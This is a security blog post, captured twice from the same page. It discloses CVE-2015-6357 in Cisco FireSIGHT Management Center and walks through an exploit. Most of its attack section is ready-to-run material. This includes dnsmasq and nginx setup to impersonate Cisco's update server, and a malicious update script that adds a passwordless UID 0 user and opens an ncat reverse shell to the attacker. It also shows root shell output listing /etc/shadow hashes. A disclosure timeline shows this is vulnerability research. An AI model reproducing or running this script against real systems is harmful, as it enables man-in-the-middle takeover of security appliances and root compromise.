the IP address of the “compromised” DNS server (192.168.1.1) and save the change.

## Running the Exploit

The exploit uses the `ncat` command installed by default on the FireSIGHT
server to create a reverse shell to the Kali host. On the Kali host you need to
listen for the reverse shell connection from the FireSIGHT server:

```
root@kali# ncat -v -l 4444

```

Then on the FireSIGHT web portal browse to `System > Updates > Rule Updates`
and select `Download new rule update from the Support Site` and click the
`Import` button. The server will then download the `sf.xml` update manifest from
the attacker’s server, see that there is an update available and will
download the update and execute it as the `www` user. The update/exploit script
below takes advantage of the fact that the `www` user has a number of `sudo` commands
it can run including `useradd`. The exploit creates a new `toor` user with an
empty passwd and then uses `su` to elevate privileges and start a reverse shell
connection back to the attackers server.

```
#!/bin/sh
# add a new UID 0 "toor" user with an empty password
sudo useradd -o -p '$1$FuV6TnrC$rKJCjOHJXuFhl2djLOBmF.' -g root -c toor -u 0 -s /bin/sh \
 -d /root toor
# su to toor and start the reverse shell
echo | su - toor -c "/usr/local/sf/nmap/bin/ncat -e /bin/sh support.sourcefire.com 4444"
exit 0

```

The exploit script may be changed to run any other desired commands. If the
script is changed then the `<md5sum>` XML tag value in `sf.xml` must be updated
with the new MD5 hash of the exploit script.

This is an example of the output you should see on the Kali host when the
exploit is successful and a remote shell on the FireSIGHT server is opened and
the `id` and `cat /etc/passwd` commands are run:

```
root@kali# ncat -v -l 4444
Ncat: Version 6.49BETA4 ( http://nmap.org/ncat )
Ncat: Listening on :::4444
Ncat: Listening on 0.0.0.0:4444
Ncat: Connection from 192.168.1.99.
Ncat: Connection from 192.168.1.99:41637.
id
uid=0(root) gid=0(root) groups=0(root)
cat /etc/shadow
root:x:11869:0:::::
bin:*:9797:0:::::
daemon:*:9797:0:::::
mysql:*:9797:0:::::
nobody:*:9797:0:::::
sshd:*:9797:0:::::
www:*:9797:0:::::
sfsnort:*:9797:0:::::
sfremediation:*:9797:0:::::
sfrna:*:9797:0:::::
snorty:*:9797:0:::::
admin:$6$GCOeXpyR$Qhq6Eq5aSW8n.15RajwYrHVLud8NaN4aKEkVXC43I5m/X.ux/bgIHAplYifOaxTIxaIThqOBGmZgO5aey5tjE/:11869:0:::::
toor:$1$FuV6TnrC$rKJCjOHJXuFhl2djLOBmF.:16679:0:99999:7:::

```
## Obtaining the Exploit

The files used in this exploit may be obtained from [github](https://github.com/mattimustang/firepwner "CVE-2015-6357 Exploit Code").

## Disclosure Timeline

* 2015-08-31 Vulnerability discovered in FireSIGHT 5.4.x and exploit developed
  by Matthew Flanagan.
* 2015-09-01 Initial contact made with Cisco PSIRT psirt@cisco.com.
* 2015-09-01 PSIRT responded asking for more information.
* 2015-09-01 Matthew Flanagan provided PSIRT with full write up and exploit of vulnerability.
* 2015-09-02 PSIRT raised FireSIGHT defect and incident PSIRT-190974966.
* 2015-09-15 Matthew Flanagan reported to Cisco PSIRT that versions 5.2.0 and 5.3.0 are also
  vulnerable.
* 2015-10-16 PSIRT advised me of the CVSS score they assigned to the vulnerability.
* 2015-11-09 PSIRT assigned CVE ID CVE-2015-6357.
* 2015-11-16 [Cisco FireSIGHT Management Center Certificate Validation
  Vulnerability](http://tools.cisco.com/security/center/content/CiscoSecurityAdvisory/cisco-sa-20151116-fmc "Cisco FireSIGHT Management Center Certificate Validation Vulnerability") published.
* 2015-11-16 Matthew Flanagan’s findings published.

Posted by

[Matthew Flanagan](https://www.blogger.com/profile/15093905875465763876 "author profile")

at

[21:20](https://wadofstuff.blogspot.com/2015/11/cve-2015-6357-firepwner-exploit-for.html "permanent link")

[No comments:](https://www.blogger.com/comment/fullpage/post/4770774760495172381/1013694973102085061)

[![](https://resources.blogblog.com/img/icon18_email.gif)](https://www.blogger.com/email-post/4770774760495172381/1013694973102085061 "Email Post")

[![](https://resources.blogblog.com/img/icon18_edit_allbkg.gif)](https://www.blogger.com/post-edit.g?blogID=4770774760495172381&postID=1013694973102085061&from=pencil "Edit Post")

[Email This](https://www.blogger.com/share-post.g?blogID=4770774760495172381&postID=1013694973102085061&target=email "Email This")[BlogThis!](https://www.blogger.com/share-post.g?blogID=4770774760495172381&postID=1013694973102085061&target=blog "BlogThis!")[Share to X](https://www.blogger.com/share-post.g?blogID=4770774760495172381&postID=1013694973102085061&target=twitter "Share to X")[Share to Facebook](https://www.blogger.com/share-post.g?blogID=4770774760495172381&postID=1013694973102085061&target=facebook "Share to Facebook")[Share to Pinterest](https://www.blogger.com/share-post.g?blogID=4770774760495172381&postID=1013694973102085061&target=pinterest "Share to Pinterest")

Labels:
[cisco](https://wadofstuff.blogspot.com/search/label/cisco),
[cve](https://wadofstuff.blogspot.com/search/label/cve),
[exploit](https://wadofstuff.blogspot.com/search/label/exploit),
[security](https://wadofstuff.blogspot.com/search/label/security)

## Thursday, 9 April 2015

### [Project Repositories Have Moved to GitHub](https://wadofstuff.blogspot.com/2015/04/project-repositories-have-moved-to.html)

With Google [announcing](http://google-opensource.blogspot.com.au/2015/03/farewell-to-google-code.html) last month that they are shutting down Google Code I have moved my old and unloved code repositories to [GitHub](https://github.com/mattimustang?tab=repositories). The main code base that seems to still be in use by others is the [Django Full Serializer](https://github.com/mattimustang/wadofstuff/tree/master/python/serializer) which I may split out into its own repository one day.

Posted by

[Matthew Flanagan](https://www.blogger.com/profile/15093905875465763876 "author profile")

at

[09:05](https://wadofstuff.blogspot.com/2015/04/project-repositories-have-moved-to.html "permanent link")

[![](https://resources.blogblog.com/img/icon18_email.gif)](https://www.blogger.com/email-post/4770774760495172381/8477638678327820576 "Email Post")

[![](https://resources.blogblog.com/img/icon18_edit_allbkg.gif)](https://www.blogger.com/post-edit.g?blogID=4770774760495172381&postID=8477638678327820576&from=pencil "Edit Post")

[Email This](https://www.blogger.com/share-post.g?blogID=4770774760495172381&postID=8477638678327820576&target=email "Email This")[BlogThis!](https://www.blogger.com/share-post.g?blogID=4770774760495172381&postID=8477638678327820576&target=blog "BlogThis!")[Share to X](https://www.blogger.com/share-post.g?blogID=4770774760495172381&postID=8477638678327820576&target=twitter "Share to X")[Share to Facebook](https://www.blogger.com/share-post.g?blogID=4770774760495172381&postID=8477638678327820576&target=facebook "Share to Facebook")[Share to Pinterest](https://www.blogger.com/share-post.g?blogID=4770774760495172381&postID=8477638678327820576&target=pinterest "Share to Pinterest")

Labels:
[django](https://wadofstuff.blogspot.com/search/label/django),
[programming](https://wadofstuff.blogspot.com/search/label/programming),
[serializer](https://wadofstuff.blogspot.com/search/label/serializer)

[Newer Posts](https://wadofstuff.blogspot.com/ "Newer Posts")

[Older Posts](https://wadofstuff.blogspot.com/search?updated-max=2015-04-09T09:05:00%2B10:00&max-results=5 "Older Posts")

[Home](https://wadofstuff.blogspot.com/)

Subscribe to:
[Posts (Atom)](https://wadofstuff.blogspot.com/feeds/posts/default)

## About Me

[Matthew Flanagan](https://www.blogger.com/profile/15093905875465763876)

[View my complete profile](https://www.blogger.com/profile/15093905875465763876)

## Subscribe To

![](https://resources.blogblog.com/img/widgets/arrow_dropdown.gif)
![](https://resources.blogblog.com/img/icon_feed12.png)
Posts

[![](https://resources.blogblog.com/img/widgets/subscribe-netvibes.png)](https://www.netvibes.com/subscribe.php?url=https%3A%2F%2Fwadofstuff.blogspot.com%2Ffeeds%2Fposts%2Fdefault)
[![](https://resources.blogblog.com/img/widgets/subscribe-yahoo.png)](https://add.my.yahoo.com/content?url=https%3A%2F%2Fwadofstuff.blogspot.com%2Ffeeds%2Fposts%2Fdefault)
[![](https://resources.blogblog.com/img/icon_feed12.png)
Atom](https://wadofstuff.blogspot.com/feeds/posts/default)

![](https://resources.blogblog.com/img/widgets/arrow_dropdown.gif)
![](https://resources.blogblog.com/img/icon_feed12.png)
Posts

![](https://resources.blogblog.com/img/widgets/arrow_dropdown.gif)
![](https://resources.blogblog.com/img/icon_feed12.png)
All Comments

[![](https://resources.blogblog.com/img/widgets/subscribe-netvibes.png)](https://www.netvibes.com/subscribe.php?url=https%3A%2F%2Fwadofstuff.blogspot.com%2Ffeeds%2Fcomments%2Fdefault)
[![](https://resources.blogblog.com/img/widgets/subscribe-yahoo.png)](https://add.my.yahoo.com/content?url=https%3A%2F%2Fwadofstuff.blogspot.com%2Ffeeds%2Fcomments%2Fdefault)
[![](https://resources.blogblog.com/img/icon_feed12.png)
Atom](https://wadofstuff.blogspot.com/feeds/comments/default)

![](https://resources.blogblog.com/img/widgets/arrow_dropdown.gif)
![](https://resources.blogblog.com/img/icon_feed12.png)
All Comments

## Labels

[advisory](https://wadofstuff.blogspot.com/search/label/advisory)
(1)

[apache](https://wadofstuff.blogspot.com/search/label/apache)
(2)

[apple](https://wadofstuff.blogspot.com/search/label/apple)
(3)

[buildbot](https://wadofstuff.blogspot.com/search/label/buildbot)
(2)

[checkpoint](https://wadofstuff.blogspot.com/search/label/checkpoint)
(1)

[cisco](https://wadofstuff.blogspot.com/search/label/cisco)
(1)

[cve](https://wadofstuff.blogspot.com/search/label/cve)
(1)

[dhcp](https://wadofstuff.blogspot.com/search/label/dhcp)
(2)

[django](https://wadofstuff.blogspot.com/search/label/django)
(12)

[dtrace](https://wadofstuff.blogspot.com/search/label/dtrace)
(1)

[exploit](https://wadofstuff.blogspot.com/search/label/exploit)
(1)

[flash archive](https://wadofstuff.blogspot.com/search/label/flash%20archive)
(4)

[forms](https://wadofstuff.blogspot.com/search/label/forms)
(2)

[infrastructure](https://wadofstuff.blogspot.com/search/label/infrastructure)
(5)

[iphoto](https://wadofstuff.blogspot.com/search/label/iphoto)
(3)

[ipv4](https://wadofstuff.blogspot.com/search/label/ipv4)
(6)

[ipv6](https://wadofstuff.blogspot.com/search/label/ipv6)
(7)

[jass](https://wadofstuff.blogspot.com/search/label/jass)
(7)

[json](https://wadofstuff.blogspot.com/search/label/json)
(3)

[jumpstart](https://wadofstuff.blogspot.com/search/label/jumpstart)
(10)

[macosx](https://wadofstuff.blogspot.com/search/label/macosx)
(2)

[models](https://wadofstuff.blogspot.com/search/label/models)
(1)

[networking](https://wadofstuff.blogspot.com/search/label/networking)
(4)

[nfs](https://wadofstuff.blogspot.com/search/label/nfs)
(2)

[nmap](https://wadofstuff.blogspot.com/search/label/nmap)
(2)

[openvpn](https://wadofstuff.blogspot.com/search/label/openvpn)
(1)

[perl](https://wadofstuff.blogspot.com/search/label/perl)
(1)

[programming](https://wadofstuff.blogspot.com/search/label/programming)
(9)

[python](https://wadofstuff.blogspot.com/search/label/python)
(14)

[ruby](https://wadofstuff.blogspot.com/search/label/ruby)
(1)

[security](https://wadofstuff.blogspot.com/search/label/security)
(3)

[serializer](https://wadofstuff.blogspot.com/search/label/serializer)
(4)

[servicetags](https://wadofstuff.blogspot.com/search/label/servicetags)
(2)

[smf](https://wadofstuff.blogspot.com/search/label/smf)
(6)

[solaris](https://wadofstuff.blogspot.com/search/label/solaris)
(31)

[splunk](https://wadofstuff.blogspot.com/search/label/splunk)
(4)

[sst jass](https://wadofstuff.blogspot.com/search/label/sst%20jass)
(1)

[testing](https://wadofstuff.blogspot.com/search/label/testing)
(1)

[zfs](https://wadofstuff.blogspot.com/search/label/zfs)
(3)

## Blog Archive

* ▼
  [2015](https://wadofstuff.blogspot.com/2015/)
  (2)
  + ▼
    [November](https://wadofstuff.blogspot.com/2015/11/)
    (1)
    - [CVE-2015-6357: FirePWNER Exploit for Cisco FireSIG...](https://wadofstuff.blogspot.com/2015/11/cve-2015-6357-firepwner-exploit-for.html)
  + ►
    [April](https://wadofstuff.blogspot.com/2015/04/)
    (1)
    - [Project Repositories Have Moved to GitHub](https://wadofstuff.blogspot.com/2015/04/project-repositories-have-moved-to.html)

* ►
  [2012](https://wadofstuff.blogspot.com/2012/)
  (1)
  + ►
    [March](https://wadofstuff.blogspot.com/2012/03/)
    (1)

* ►
  [2011](https://wadofstuff.blogspot.com/2011/)
  (4)
  + ►
    [August](https://wadofstuff.blogspot.com/2011/08/)
    (1)
  + ►
    [July](https://wadofstuff.blogspot.com/2011/07/)
    (1)
  + ►
    [June](https://wadofstuff.blogspot.com/2011/06/)
    (1)
  + ►
    [February](https://wadofstuff.blogspot.com/2011/02/)
    (1)

* ►
  [2010](https://wadofstuff.blogspot.com/2010/)
  (4)
  + ►
    [December](https://wadofstuff.blogspot.com/2010/12/)
    (1)
  + ►
    [November](https://wadofstuff.blogspot.com/2010/11/)
    (1)
  + ►
    [September](https://wadofstuff.blogspot.com/2010/09/)
    (2)

* ►
  [2009](https://wadofstuff.blogspot.com/2009/)
  (18)
  + ►
    [November](https://wadofstuff.blogspot.com/2009/11/)
    (2)
  + ►
    [October](https://wadofstuff.blogspot.com/2009/10/)
    (2)
  + ►
    [August](https://wadofstuff.blogspot.com/2009/08/)
    (2)
  + ►
    [July](https://wadofstuff.blogspot.com/2009/07/)
    (4)
  + ►
    [May](https://wadofstuff.blogspot.com/2009/05/)
    (3)
  + ►
    [April](https://wadofstuff.blogspot.com/2009/04/)
    (1)
  + ►
    [March](https://wadofstuff.blogspot.com/2009/03/)
    (1)
  + ►
    [February](https://wadofstuff.blogspot.com/2009/02/)
    (3)

* ►
  [2008](https://wadofstuff.blogspot.com/2008/)
  (8)
  + ►
    [September](https://wadofstuff.blogspot.com/2008/09/)
    (1)
  + ►
    [June](https://wadofstuff.blogspot.com/2008/06/)
    (2)
  + ►
    [April](https://wadofstuff.blogspot.com/2008/04/)
    (3)
  + ►
    [March](https://wadofstuff.blogspot.com/2008/03/)
    (1)
  + ►
    [February](https://wadofstuff.blogspot.com/2008/02/)
    (1)

* ►
  [2007](https://wadofstuff.blogspot.com/2007/)
  (20)
  + ►
    [November](https://wadofstuff.blogspot.com/2007/11/)
    (2)
  + ►
    [October](https://wadofstuff.blogspot.com/2007/10/)
    (1)
  + ►
    [September](https://wadofstuff.blogspot.com/2007/09/)
    (2)
  + ►
    [August](https://wadofstuff.blogspot.com/2007/08/)
    (2)
  + ►
    [May](https://wadofstuff.blogspot.com/2007/05/)
    (2)
  + ►
    [March](https://wadofstuff.blogspot.com/2007/03/)
    (5)
  + ►
    [February](https://wadofstuff.blogspot.com/2007/02/)
    (4)
  + ►
    [January](https://wadofstuff.blogspot.com/2007/01/)
    (2)

## Projects

* [Wad of Stuff code repository](https://github.com/mattimustang/wadofstuff)
* [iPhoto Keyword Utilities](https://github.com/mattimustang/iphotokeywordutilities)

|  |  |
| --- | --- |

Travel theme. Theme images by [sandsun](http://www.istockphoto.com/googleimages.php?id=7944350&platform=blogger&langregion=en_GB). Powered by [Blogger](https://www.blogger.com).



=== Content from wadofstuff.blogspot.com_101c43b7_20250126_071545.html ===


# [Wad of Stuff](https://wadofstuff.blogspot.com/)

IT infrastructure automation, security research, tools, tips and tricks.

## Monday, 16 November 2015

### [CVE-2015-6357: FirePWNER Exploit for Cisco FireSIGHT Management Center SSL Validation Vulnerability](https://wadofstuff.blogspot.com/2015/11/cve-2015-6357-firepwner-exploit-for.html)

## Introduction

On its own the [Cisco FireSIGHT Management Center Certificate Validation
Vulnerability](http://tools.cisco.com/security/center/content/CiscoSecurityAdvisory/cisco-sa-20151116-fmc "Cisco FireSIGHT Management Center Certificate Validation Vulnerability") is a **medium** severity vulnerability with a **CVSS** of **5.1**.
However, this vulnerability is an example of why SSL certificate validation is so
important. In this exploit I will demonstrate how the vulnerability can be leveraged
to obtain privileged remote command execution on a Cisco FireSIGHT system. The
exploit chains the SSL validation vulnerability with the software update process
on the Cisco FireSIGHT system to trick the target system into downloading a malicious
update and executing it to obtain a reverse shell with **root** privileges.

![AND THAT'S WHY YOU SHOULD ALWAYS VALIDATE SSL CERTIFICATES](https://i.imgflip.com/u60wm.jpg)

## The Vulnerability

The Cisco FireSIGHT Management Center appliance is used to manage Cisco
FirePOWER Intrusion Prevention Systems (IPS), also known as Sourcefire IPS.
FireSIGHT is responsible for downloading updated IPS signatures and installing
them on managed IPS devices.

The FireSIGHT Management Center allows an administrator to manually initiate an
update of the IPS rules or schedule the updates to occur daily/weekly/monthly.

When the FireSIGHT Management Center performs an update it uses the `curl` UNIX
command to perform the download from [Sourcefire Support](https://support.sourcefire.com "Sourcefire support"). The
invocation of the `curl` command is passed the `-k` (aka `--insecure`) option
which tells `curl` to not validate any SSL certificates presented by the server.

Here is the the `ps` output of the server downloading an update:

```
admin@FIRESIGHT01:/var/sf$ ps -auxwww | grep curl
root      8351  0.0  0.0  37396  2708 ?        S    02:02   0:00 /usr/local/bin/curl -k -o /var/sf/updates/Sourcefire_Geodb_Update-2015-08-17-002.sh https://support.sourcefire.com/auto-update/auto-dl.cgi/XX:XX:XX:XX:XX:XX:XX/Download/files/Sourcefire_Geodb_Update-2015-08-17-002.sh

```

FireSIGHT updates come in the form of a [makeself](https://github.com/megastep/makeself "makeself") generated shell script
that contains both UNIX Bourne shell commands as well as the binary data
to be delivered in the update. These shell update shell scripts are executed
directly on the FireSIGHT server as the local `www` user.

An attacker that is able to perform a man in the middle attack against
a FireSIGHT server can force it to connect to a spoofed version of the
[Sourcefire Support](https://support.sourcefire.com "Sourcefire support") web site and download a malicious update script that
will execute any command the attacker wishes on the FireSIGHT server.

The SSL Validation vulnerability enables this to occur resulting in the system
happily ignoring the attackers spoofed SSL certificate and downloading the
malicious update and executing it.

If the `curl` command were to validate the SSL certificate then it would fail
to download the malicious script and protect the FireSIGHT server from the
attacker.

This exploit demonstrates the danger of not validating the SSL certificate
by exploiting the vulnerability to gain remote command execution as the root
user.

## The Attack Scenario

The attack scenario is one where an attacker has attained the ability to man in
the middle the traffic from the FireSIGHT server to the
<https://support.sourcefire.com> web site. The simplest way to demonstrate this
is to set up a “compromised” DNS server that responds to queries for the domain
`support.sourcefire.com` with the IP address of a web server that the attacker
controls.

In a real attack scenario the attacker may use any number of man in the middle
techniques to acheive the same means. Such as:

* DNS cache poisioning
* ARP spoofing. e.g ettercap.

This exploit was tested against the following FireSIGHT Virtual Appliance versions:

* 5.2.0
* 5.3.0
* 5.4.0
* 5.4.1.1
* 5.4.1.2

In the PoC below the FireSIGHT server was assigned the IP address `192.168.1.99`.

The attacking host was running Kali Linux 2.0 though the set up below
should work on any Debian Linux based server. The IP address of the Kali host
in the example below is `192.168.1.1`. The Kali host is used to run the DNS server
as well as the spoofed [Sourcefire Support](https://support.sourcefire.com "Sourcefire support") web site.

## Set up dnsmasq

The exploit requires the ability to spoof the DNS response for
`support.sourcefire.com`. A dnsmasq server is run to provide this capability and
act as the “compromised” DNS server.

Install dnsmasq:

```
root@kali# apt-get install dnsmasq

```

Configure dnsmasq:

```
root@kali# cat << EOF > /etc/dnsmasq.d/firepnwer.conf
address=/support.sourcefire.com/192.168.1.1
server=8.8.8.8
EOF

```

Edit the IP address on the `address` line to be the address
of the web server you will serve the updates from.

Start dnsmasq:

```
root@kali# service dnsmasq start

```
## Set up nginx

A web server is required to serve the exploit to the FireSIGHT server when it
requests an update.

Install nginx web server:

```
root@kali# apt-get install nginx

```

Create a self signed certificate to impersonate `support.sourcefire.com`:

```
root@kali# mkdir /etc/nginx/ssl

root@kali# openssl req -x509 -nodes -days 365 -newkey rsa:2048 -keyout /etc/nginx/ssl/nginx.key \
 -out /etc/nginx/ssl/nginx.crt

Country Name (2 letter code) [AU]:AU
State or Province Name (full name) [Some-State]:New South Wales
Locality Name (eg, city) []:Newcastle
Organization Name (eg, company) [Internet Widgits Pty Ltd]:FirePWNER Exploit.
Organizational Unit Name (eg, section) []:
Common Name (e.g. server FQDN or YOUR name) []:support.sourcefire.com
Email Address []:

```

Configure nginx by replacing the contents of
`/etc/nginx/sites-available/default` with:

```
server {
    listen 80 default_server;
    listen [::]:80 default_server;

    listen 443 ssl;

    root /var/www/html;

    index index.html index.htm index.nginx-debian.html;

    server_name support.sourcefire.com;
    ssl_certificate /etc/nginx/ssl/nginx.crt;
    ssl_certificate_key /etc/nginx/ssl/nginx.key;

    location / {
        try_files $uri $uri/ =404;
    }

    # rewrite requests that contain the clients license key
    location ~* /auto-update/auto-dl.cgi/[A-F0-9][A-F0-9]:.* {
        rewrite ^(/auto-update/auto-dl.cgi)/[A-F0-9][A-F0-9]:[A-F0-9][A-F0-9]:[A-F0-9][A-F0-9]:[A-F0-9][A-F0-9]:[A-F0-9][A-F0-9]:[A-F0-9][A-F0-9]:[A-F0-9][A-F0-9]/(.*)$ $1/$2;
    }

    location /auto-update {
        root /var/www/html/firepwner;
    }

}

```

Start nginx:

```
root@kali# service nginx start

```
## Setting up the exploit

The FirePWNER exploit requires two files to be served from the web server. The
first file is the update manifest which is an XML file that contains a list of
the updates available, their download location and MD5 hashes.

First you need to create some directories:

```
root@kali# mkdir \
    /var/www/html/firepwner/auto-update/auto-dl.cgi/{Download/files,GetCurrent}

```

Then copy the exploit files into them:

```
root@kali# cp sf.xml /var/www/html/firepwner/auto-update/auto-dl.cgi/GetCurrent/sf.xml
root@kali# cp firepwner.sh \
    /var/www/html/firepwner/auto-update/auto-dl.cgi/Download/files/firepwner.sh

```

After copying these files you should be able to browse to
`http://192.168.1.1/auto-update/auto-dl.cgi/GetCurrent/sf.xml`

## Configure the FireSIGHT server DNS

Next, for exploit demonstration purposes, the FireSIGHT server needs to be configured to
use the “compromised” DNS server. Login to the FireSIGHT web portal and go to
`System > Local > Configure > Management Interfaces` and set the Primary DNS server to
the IP address of the “compromised” DNS server (192.168.1.1) and save the change.

## Running the Exploit

The exploit uses the `ncat` command installed by default on the FireSIGHT
server to create a reverse shell to the Kali host. On the Kali host you need to
listen for the reverse shell connection from the FireSIGHT server:

```
root@kali# ncat -v -l 4444

```

Then on the FireSIGHT web portal browse to `System > Updates > Rule Updates`
and select `Download new rule update from the Support Site` and click the
`Import` button. The server will then download the `sf.xml` update manifest from
the attacker’s server, see that there is an update available and will
download the update and execute it as the `www` user. The update/exploit script
below takes advantage of the fact that the `www` user has a number of `sudo` commands
it can run including `useradd`. The exploit creates a new `toor` user with an
empty passwd and then uses `su` to elevate privileges and start a reverse shell
connection back to the attackers server.

```
#!/bin/sh
# add a new UID 0 "toor" user with an empty password
sudo useradd -o -p '$1$FuV6TnrC$rKJCjOHJXuFhl2djLOBmF.' -g root -c toor -u 0 -s /bin/sh \
 -d /root toor
# su to toor and start the reverse shell
echo | su - toor -c "/usr/local/sf/nmap/bin/ncat -e /bin/sh support.sourcefire.com 4444"
exit 0

```

The exploit script may be changed to run any other desired commands. If the
script is changed then the `<md5sum>` XML tag value in `sf.xml` must be updated
with the new MD5 hash of the exploit script.

This is an example of the output you should see on the Kali host when the
exploit is successful and a remote shell on the FireSIGHT server is opened and
the `id` and `cat /etc/passwd` commands are run:

```
root@kali# ncat -v -l 4444
Ncat: Version 6.49BETA4 ( http://nmap.org/ncat )
Ncat: Listening on :::4444
Ncat: Listening on 0.0.0.0:4444
Ncat: Connection from 192.168.1.99.
Ncat: Connection from 192.168.1.99:41637.
id
uid=0(root) gid=0(root) groups=0(root)
cat /etc/shadow
root:x:11869:0:::::
bin:*:9797:0:::::
daemon:*:9797:0:::::
mysql:*:9797:0:::::
nobody:*:9797:0:::::
sshd:*:9797:0:::::
www:*:9797:0:::::
sfsnort:*:9797:0:::::
sfremediation:*:9797:0:::::
sfrna:*:9797:0:::::
snorty:*:9797:0:::::
admin:$6$GCOeXpyR$Qhq6Eq5aSW8n.15RajwYrHVLud8NaN4aKEkVXC43I5m/X.ux/bgIHAplYifOaxTIxaIThqOBGmZgO5aey5tjE/:11869:0:::::
toor:$1$FuV6TnrC$rKJCjOHJXuFhl2djLOBmF.:16679:0:99999:7:::

```
## Obtaining the Exploit

The files used in this exploit may be obtained from [github](https://github.com/mattimustang/firepwner "CVE-2015-6357 Exploit Code").

## Disclosure Timeline

* 2015-08-31 Vulnerability discovered in FireSIGHT 5.4.x and exploit developed
  by Matthew Flanagan.
* 2015-09-01 Initial contact made with Cisco PSIRT psirt@cisco.com.
* 2015-09-01 PSIRT responded asking for more information.
* 2015-09-01 Matthew Flanagan provided PSIRT with full write up and exploit of vulnerability.
* 2015-09-02 PSIRT raised FireSIGHT defect and incident PSIRT-190974966.
* 2015-09-15 Matthew Flanagan reported to Cisco PSIRT that versions 5.2.0 and 5.3.0 are also
  vulnerable.
* 2015-10-16 PSIRT advised me of the CVSS score they assigned to the vulnerability.
* 2015-11-09 PSIRT assigned CVE ID CVE-2015-6357.
* 2015-11-16 [Cisco FireSIGHT Management Center Certificate Validation
  Vulnerability](http://tools.cisco.com/security/center/content/CiscoSecurityAdvisory/cisco-sa-20151116-fmc "Cisco FireSIGHT Management Center Certificate Validation Vulnerability") published.
* 2015-11-16 Matthew Flanagan’s findings published.

Posted by

[Matthew Flanagan](https://www.blogger.com/profile/15093905875465763876 "author profile")

at

[21:20](https://wadofstuff.blogspot.com/2015/11/cve-2015-6357-firepwner-exploit-for.html "permanent link")

[No comments:](https://www.blogger.com/comment/fullpage/post/4770774760495172381/1013694973102085061)

[![](https://resources.blogblog.com/img/icon18_email.gif)](https://www.blogger.com/email-post/4770774760495172381/1013694973102085061 "Email Post")

[![](https://resources.blogblog.com/img/icon18_edit_allbkg.gif)](https://www.blogger.com/post-edit.g?blogID=4770774760495172381&postID=1013694973102085061&from=pencil "Edit Post")

[Email This](https://www.blogger.com/share-post.g?blogID=4770774760495172381&postID=1013694973102085061&target=email "Email This")[BlogThis!](https://www.blogger.com/share-post.g?blogID=4770774760495172381&postID=1013694973102085061&target=blog "BlogThis!")[Share to X](https://www.blogger.com/share-post.g?blogID=4770774760495172381&postID=1013694973102085061&target=twitter "Share to X")[Share to Facebook](https://www.blogger.com/share-post.g?blogID=4770774760495172381&postID=1013694973102085061&target=facebook "Share to Facebook")[Share to Pinterest](https://www.blogger.com/share-post.g?blogID=4770774760495172381&postID=1013694973102085061&target=pinterest "Share to Pinterest")

Labels:
[cisco](https://wadofstuff.blogspot.com/search/label/cisco),
[cve](https://wadofstuff.blogspot.com/search/label/cve),
[exploit](https://wadofstuff.blogspot.com/search/label/exploit),
[security](https://wadofstuff.blogspot.com/search/label/security)

[Newer Posts](https://wadofstuff.blogspot.com/ "Newer Posts")

[Older Posts](https://wadofstuff.blogspot.com/search?updated-max=2015-11-16T21:20:00%2B11:00&max-results=5 "Older Posts")

[Home](https://wadofstuff.blogspot.com/)

Subscribe to:
[Posts (Atom)](https://wadofstuff.blogspot.com/feeds/posts/default)

## About Me

[Matthew Flanagan](https://www.blogger.com/profile/15093905875465763876)

[View my complete profile](https://www.blogger.com/profile/15093905875465763876)

## Subscribe To

![](https://resources.blogblog.com/img/widgets/arrow_dropdown.gif)
![](https://resources.blogblog.com/img/icon_feed12.png)
Posts

[![](https://resources.blogblog.com/img/widgets/subscribe-netvibes.png)](https://www.netvibes.com/subscribe.php?url=https%3A%2F%2Fwadofstuff.blogspot.com%2Ffeeds%2Fposts%2Fdefault)
[![](https://resources.blogblog.com/img/widgets/subscribe-yahoo.png)](https://add.my.yahoo.com/content?url=https%3A%2F%2Fwadofstuff.blogspot.com%2Ffeeds%2Fposts%2Fdefault)
[![](https://resources.blogblog.com/img/icon_feed12.png)
Atom](https://wadofstuff.blogspot.com/feeds/posts/default)

![](https://resources.blogblog.com/img/widgets/arrow_dropdown.gif)
![](https://resources.blogblog.com/img/icon_feed12.png)
Posts

![](https://resources.blogblog.com/img/widgets/arrow_dropdown.gif)
![](https://resources.blogblog.com/img/icon_feed12.png)
All Comments

[![](https://resources.blogblog.com/img/widgets/subscribe-netvibes.png)](https://www.netvibes.com/subscribe.php?url=https%3A%2F%2Fwadofstuff.blogspot.com%2Ffeeds%2Fcomments%2Fdefault)
[![](https://resources.blogblog.com/img/widgets/subscribe-yahoo.png)](https://add.my.yahoo.com/content?url=https%3A%2F%2Fwadofstuff.blogspot.com%2Ffeeds%2Fcomments%2Fdefault)
[![](https://resources.blogblog.com/img/icon_feed12.png)
Atom](https://wadofstuff.blogspot.com/feeds/comments/default)

![](https://resources.blogblog.com/img/widgets/arrow_dropdown.gif)
![](https://resources.blogblog.com/img/icon_feed12.png)
All Comments

## Labels

[advisory](https://wadofstuff.blogspot.com/search/label/advisory)
(1)

[apache](https://wadofstuff.blogspot.com/search/label/apache)
(2)

[apple](https://wadofstuff.blogspot.com/search/label/apple)
(3)

[buildbot](https://wadofstuff.blogspot.com/search/label/buildbot)
(2)

[checkpoint](https://wadofstuff.blogspot.com/search/label/checkpoint)
(1)

[cisco](https://wadofstuff.blogspot.com/search/label/cisco)
(1)

[cve](https://wadofstuff.blogspot.com/search/label/cve)
(1)

[dhcp](https://wadofstuff.blogspot.com/search/label/dhcp)
(2)

[django](https://wadofstuff.blogspot.com/search/label/django)
(12)

[dtrace](https://wadofstuff.blogspot.com/search/label/dtrace)
(1)

[exploit](https://wadofstuff.blogspot.com/search/label/exploit)
(1)

[flash archive](https://wadofstuff.blogspot.com/search/label/flash%20archive)
(4)

[forms](https://wadofstuff.blogspot.com/search/label/forms)
(2)

[infrastructure](https://wadofstuff.blogspot.com/search/label/infrastructure)
(5)

[iphoto](https://wadofstuff.blogspot.com/search/label/iphoto)
(3)

[ipv4](https://wadofstuff.blogspot.com/search/label/ipv4)
(6)

[ipv6](https://wadofstuff.blogspot.com/search/label/ipv6)
(7)

[jass](https://wadofstuff.blogspot.com/search/label/jass)
(7)

[json](https://wadofstuff.blogspot.com/search/label/json)
(3)

[jumpstart](https://wadofstuff.blogspot.com/search/label/jumpstart)
(10)

[macosx](https://wadofstuff.blogspot.com/search/label/macosx)
(2)

[models](https://wadofstuff.blogspot.com/search/label/models)
(1)

[networking](https://wadofstuff.blogspot.com/search/label/networking)
(4)

[nfs](https://wadofstuff.blogspot.com/search/label/nfs)
(2)

[nmap](https://wadofstuff.blogspot.com/search/label/nmap)
(2)

[openvpn](https://wadofstuff.blogspot.com/search/label/openvpn)
(1)

[perl](https://wadofstuff.blogspot.com/search/label/perl)
(1)

